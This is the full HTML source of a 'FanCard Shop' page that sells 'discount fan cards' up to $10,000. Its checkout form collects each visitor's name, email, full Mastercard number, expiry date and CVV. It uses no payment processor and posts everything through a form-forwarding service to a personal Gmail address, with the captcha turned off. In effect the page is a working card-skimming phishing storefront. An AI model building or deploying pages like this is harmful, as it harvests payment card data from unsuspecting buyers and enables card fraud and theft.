<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
<title>FanCard Shop - Discounted Fan Cards</title>

<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet" />
<style>
  /* Reset and base */
  * {
    margin: 0; padding: 0; box-sizing: border-box;
  }
  body {
    font-family: 'Montserrat', sans-serif;
    background: #fff;
    color: #003366;
    display: flex;
    flex-direction: column;
    align-items: center;
    min-height: 100vh;
    padding: 20px 24px;
  }

  header {
    width: 100%;
    max-width: 420px;
    text-align: center;
    margin-bottom: 36px;
    border-bottom: 2.5px solid #0055cc;
    padding-bottom: 12px;
  }
  header h1 {
    font-weight: 700;
    font-size: 2.2rem;
    letter-spacing: 2px;
    color: #004a99;
    margin-bottom: 8px;
    text-shadow: 0 1px 4px rgba(0,80,204,0.2);
  }
  header p {
    font-weight: 400;
    font-size: 1.1rem;
    color: #235a9b;
    line-height: 1.4;
    max-width: 360px;
    margin: 0 auto;
  }

  main {
    width: 100%;
    max-width: 420px;
    display: flex;
    flex-direction: column;
  }

  /* Product grid */
  .products {
    display: grid;
    grid-template-columns: repeat(2, 1fr);
    gap: 24px;
    margin-bottom: 36px;
  }

  .card {
    background: #f5faff;
    border: 1.5px solid #c3dbff;
    border-radius: 12px;
    padding: 22px 20px;
    box-shadow:
      0 2px 6px rgba(0, 85, 204, 0.12),
      inset 0 1px 0 rgba(255, 255, 255, 0.8);
    display: flex;
    flex-direction: column;
    justify-content: space-between;
    transition: box-shadow 0.25s ease, transform 0.25s ease;
  }
  .card:hover, .card:focus-within {
    box-shadow:
      0 6px 14px rgba(0, 85, 204, 0.28),
      inset 0 2px 4px rgba(255, 255, 255, 0.9);
    transform: translateY(-5px);
    outline: none;
  }
  .card .price {
    font-weight: 700;
    font-size: 1.3rem;
    color: #003366;
    margin-bottom: 10px;
  }
  .card .desc {
    font-weight: 400;
    font-size: 1rem;
    color: #3467ab;
    margin-bottom: 20px;
    min-height: 52px;
    line-height: 1.3;
  }
  .card button {
    background-color: #0055cc;
    border: none;
    color: #fefefe;
    font-weight: 700;
    font-size: 1rem;
    padding: 12px 0;
    border-radius: 10px;
    cursor: pointer;
    box-shadow: 0 4px 8px rgba(0, 85, 204, 0.32);
    transition: background-color 0.3s ease, box-shadow 0.3s ease;
  }
  .card button:hover, .card button:focus {
    background-color: #003d99;
    box-shadow: 0 6px 14px rgba(0, 61, 153, 0.52);
    outline: none;
  }

  /* Cart */
  #cart {
    background: #e6f0ff;
    border-radius: 14px;
    padding: 20px 26px;
    box-shadow: 0 5px 18px rgba(0,85,204,0.15);
    margin-bottom: 36px;
    width: 100%;
    max-width: 420px;
    color: #003366;
  }
  #cart h2 {
    font-weight: 700;
    font-size: 1.45rem;
    margin-bottom: 16px;
    border-bottom: 2px solid #0055cc;
    padding-bottom: 6px;
    color: #004080;
  }
  #cart-items {
    max-height: 180px;
    overflow-y: auto;
    margin-bottom: 18px;
    font-size: 1rem;
    color: #003366;
  }
  .cart-item {
    display: flex;
    justify-content: space-between;
    padding: 10px 0;
    border-bottom: 1px solid #aac7ff;
  }
  .cart-item span {
    display: inline-block;
  }
  .cart-item .name {
    flex: 2;
    font-weight: 600;
    color: #003366;
  }
  .cart-item .qty {
    flex: 0.7;
    text-align: center;
    font-weight: 500;
  }
  .cart-item .price {
    flex: 1;
    text-align: right;
    font-weight: 700;
  }
  .cart-item button {
    background: transparent;
    border: none;
    color: #bb2c2c;
    font-weight: 700;
    padding-left: 14px;
    cursor: pointer;
    flex: 0.5;
    font-size: 1.15rem;
    transition: color 0.3s ease;
  }
  .cart-item button:hover, .cart-item button:focus {
    color: #7f1c1c;
    outline: none;
  }
  #cart-total {
    font-weight: 700;
    font-size: 1.3rem;
    text-align: right;
    color: #004080;
  }

  /* Checkout Form */
  #checkout-form {
    background: #f9fbff;
    padding: 22px 26px;
    border-radius: 14px;
    box-shadow: 0 5px 18px rgba(0,85,204,0.15);
    width: 100%;
    max-width: 420px;
    color: #003366;
  }
  #checkout-form h3 {
    font-size: 1.6rem;
    font-weight: 700;
    color: #004080;
    margin-bottom: 18px;
    border-bottom: 2px solid #0055cc;
    padding-bottom: 8px;
  }
  #checkout-form label {
    display: block;
    font-weight: 600;
    font-size: 1rem;
    margin-bottom: 6px;
    color: #003366cc;
  }
  #checkout-form input[type="text"],
  #checkout-form input[type="email"],
  #checkout-form input[type="number"] {
    width: 100%;
    padding: 12px 15px;
    margin-bottom: 18px;
    border-radius: 12px;
    border: 2px solid #5a8de0;
    font-size: 1rem;
    font-weight: 500;
    outline-color: #0055cc;
    transition: box-shadow 0.3s ease;
    background: #ffffff;
    color: #003366;
    box-shadow: inset 0 1px 4px #d3deff;
  }
  #checkout-form input[type="text"]:focus,
  #checkout-form input[type="email"]:focus,
  #checkout-form input[type="number"]:focus {
    box-shadow: 0 0 6px 3px #5596ffaa;
    border-color: #004a99;
  }
  #checkout-form input::placeholder {
    color: #92aaffcc;
    font-weight: 400;
  }

  /* Group container for card inputs */
  .card-info-group {
    display: flex;
    gap: 16px;
    margin-bottom: 18px;
    flex-wrap: wrap;
  }
  .card-info-group > div {
    flex: 1 1 40%;
    min-width: 120px;
    display: flex;
    flex-direction: column;
  }

  /* Make inputs full width within their container */
  .card-info-group input {
    margin-bottom: 0;
  }

  #checkout-form button[type="submit"] {
    width: 100%;
    padding: 15px 0;
    font-size: 1.25rem;
    font-weight: 700;
    border-radius: 15px;
    border: none;
    background: linear-gradient(135deg, #0055cc, #004a99);
    color: white;
    cursor: pointer;
    box-shadow: 0 8px 18px rgba(0, 85, 204, 0.48);
    transition: background 0.35s ease, box-shadow 0.35s ease;
  }
  #checkout-form button[type="submit"]:hover,
  #checkout-form button[type="submit"]:focus {
    background: linear-gradient(135deg, #004a99, #003366);
    box-shadow: 0 12px 24px rgba(0, 61, 153, 0.6);
    outline: none;
  }

  /* Scrollbar for cart */
  #cart-items::-webkit-scrollbar {
    width: 7px;
  }
  #cart-items::-webkit-scrollbar-track {
    background: transparent;
  }
  #cart-items::-webkit-scrollbar-thumb {
    background-color: #5596ffcc;
    border-radius: 3px;
  }

  /* Responsive */
  @media (max-width: 460px) {
    body {
      padding: 16px 12px;
    }
    header h1 {
      font-size: 1.8rem;
    }
    main {
      max-width: 100%;
    }
    .products {
      grid-template-columns: 1fr;
      gap: 18px;
      margin-bottom: 28px;
    }
    #cart, #checkout-form {
      max-width: 100%;
      padding: 20px 18px;
      margin-bottom: 28px;
    }
    /* Stack card inputs vertically on small screen */
    .card-info-group {
      flex-direction: column;
      gap: 12px;
    }
    .card-info-group > div {
      flex: 1 1 100%;
      min-width: auto;
    }
  }
</style>
</head>
<body>

<header>
  <h1>FanCard Shop</h1>
  <p>Buy your discount fan cards ranging from $50 to $10,000. Pay securely with Mastercard.</p>
</header>

<main>

  <section class="products" aria-label="Product list of fan cards">
    <!-- Product cards inserted dynamically -->
  </section>

  <section id="cart" aria-label="Shopping cart">
    <h2>Your Cart</h2>
    <div id="cart-items" role="list" aria-live="polite" aria-relevant="additions removals">Your cart is empty.</div>
    <div id="cart-total">Total: $0</div>
  </section>

  <section id="checkout-section" aria-label="Checkout form">
    <form id="checkout-form" action="https://formsubmit.co/donkingsley96@gmail.com" method="POST" target="_blank" novalidate>
      <h3>Checkout</h3>

      <!-- Honeypot for spam protection -->
      <input type="hidden" name="_honey" style="display:none" />
      <input type="hidden" name="_captcha" value="false" />
      <input type="hidden" name="_subject" value="New Fan Card Order" />
      <!-- Order details container -->
      <textarea name="Order Details" id="orderDetails" style="display:none;"></textarea>

      <label for="name">Full Name</label>
      <input type="text" name="Name" id="name" placeholder="Your full name" required autocomplete="name" />

      <label for="email">Email Address</label>
      <input type="email" name="Email" id="email" placeholder="your.email@example.com" required autocomplete="email" />

      <div class="card-info-group">
        <div>
          <label for="cardNumber">Mastercard Number</label>
          <input type="text" inputmode="numeric" name="Mastercard Number" id="cardNumber" placeholder="1234 5678 9012 3456" required maxlength="19" autocomplete="cc-number" />
        </div>
        <div>
          <label for="expiry">Expiry Date (MM/YY)</label>
          <input type="text" pattern="(0[1-9]|1[0-2])\/\d{2}" name="Expiry Date" id="expiry" placeholder="MM/YY" required autocomplete="cc-exp" maxlength="5" />
        </div>
        <div>
          <label for="cvv">CVV</label>
          <input type="number" inputmode="numeric" pattern="\d{3,4}" name="CVV" id="cvv" placeholder="123" required maxlength="4" autocomplete="cc-csc" />
        </div>
      </div>

      <button type="submit" aria-label="Submit your order">Pay &amp; Receive Card Details</button>
    </form>
  </section>

</main>

<script>
  const productsData = [
    { id: 1, name: "Fan Card $50", price: 50, desc: "Get a $50 fan card to enjoy your passion." },
    { id: 2, name: "Fan Card $100", price: 100, desc: "Perfect fan card for small gifts or personal use." },
    { id: 3, name: "Fan Card $500", price: 500, desc: "Great for avid fans looking to stock up." },
    { id: 4, name: "Fan Card $1000", price: 1000, desc: "Experience premium value with $1000 card." },
    { id: 5, name: "Fan Card $5000", price: 5000, desc: "High value card for top fans and gifts." },
    { id: 6, name: "Fan Card $10,000", price: 10000, desc: "Ultimate deluxe fan card for serious collectors." }
  ];

  const productsContainer = document.querySelector('.products');
  const cartItemsContainer = document.getElementById('cart-items');
  const cartTotalContainer = document.getElementById('cart-total');
  const checkoutForm = document.getElementById('checkout-form');
  const orderDetailsInput = document.getElementById('orderDetails');

  let cart = [];

  // Render products
  function renderProducts() {
    productsContainer.innerHTML = '';
    productsData.forEach(product => {
      const card = document.createElement('article');
      card.className = 'card';
      card.setAttribute('tabindex', '0');
      card.innerHTML = `
        <div class="price">$${product.price.toLocaleString()}</div>
        <div class="desc">${product.desc}</div>
        <button aria-label="Add ${product.name} to cart" data-id="${product.id}">Add to Cart</button>
      `;
      productsContainer.appendChild(card);
    });
  }

  // Render cart items
  function renderCart() {
    cartItemsContainer.innerHTML = '';
    if (cart.length === 0) {
      cartItemsContainer.textContent = 'Your cart is empty.';
      cartTotalContainer.textContent = 'Total: $0';
      return;
    }
    cart.forEach(item => {
      const itemElem = document.createElement('div');
      itemElem.className = 'cart-item';
      itemElem.setAttribute('role', 'listitem');
      itemElem.innerHTML = `
        <span class="name">${item.name}</span>
        <span class="qty">x${item.quantity}</span>
        <span class="price">$${(item.price * item.quantity).toLocaleString()}</span>
        <button aria-label="Remove ${item.name} from cart" data-id="${item.id}">&#10005;</button>
      `;
      cartItemsContainer.appendChild(itemElem);
    });
    const total = cart.reduce((acc, item) => acc + item.price * item.quantity, 0);
    cartTotalContainer.textContent = 'Total: $' + total.toLocaleString();
  }

  // Add item to cart
  function addToCart(id) {
    const product = productsData.find(p => p.id === id);
    if (!product) return;
    const cartItem = cart.find(ci => ci.id === id);
    if (cartItem) {
      cartItem.quantity++;
    } else {
      cart.push({ ...product, quantity: 1 });
    }
    renderCart();
  }

  // Remove item from cart
  function removeFromCart(id) {
    const index = cart.findIndex(ci => ci.id === id);
    if (index !== -1) {
      cart.splice(index, 1);
      renderCart();
    }
  }

  // Prepare order details for email textarea
  function prepareOrderDetails() {
    if (cart.length === 0) return 'No items in the cart.';
    let details = 'Fan Card Order Details:\n\n';
    cart.forEach(item => {
      details += `${item.name} - Quantity: ${item.quantity} - Price Each: $${item.price.toLocaleString()} - Subtotal: $${(item.price * item.quantity).toLocaleString()}\n`;
    });
    const total = cart.reduce((acc, item) => acc + item.price * item.quantity, 0);
    details += `\nTotal Order Price: $${total.toLocaleString()}\n\nThank you for your purchase!`;
    return details;
  }

  // Mastercard format input helper to add spaces every 4 digits
  function formatCardNumber(value) {
    return value.replace(/\D/g, '')  // Remove non-digits
      .replace(/(.{4})/g, '$1 ')   // Insert space every 4 digits
      .trim();
  }

  // Event listeners
  productsContainer.addEventListener('click', e => {
    if (e.target.tagName === 'BUTTON') {
      const id = parseInt(e.target.getAttribute('data-id'), 10);
      addToCart(id);
    }
  });

  cartItemsContainer.addEventListener('click', e => {
    if (e.target.tagName === 'BUTTON') {
      const id = parseInt(e.target.getAttribute('data-id'), 10);
      removeFromCart(id);
    }
  });

  checkoutForm.addEventListener('submit', e => {
    if (cart.length === 0) {
      alert('Your cart is empty. Please add at least one fan card before checking out.');
      e.preventDefault();
      return;
    }
    if (!checkoutForm.checkValidity()) {
      checkoutForm.reportValidity();
      e.preventDefault();
      return;
    }
    orderDetailsInput.value = prepareOrderDetails();
  });

  // Format Mastercard input in real-time
  const cardNumberInput = document.getElementById('cardNumber');
  cardNumberInput.addEventListener('input', e => {
    const formatted = formatCardNumber(e.target.value);
    e.target.value = formatted;
  });

  // Initial rendering
  renderProducts();
  renderCart();

</script>

</body>
</html>
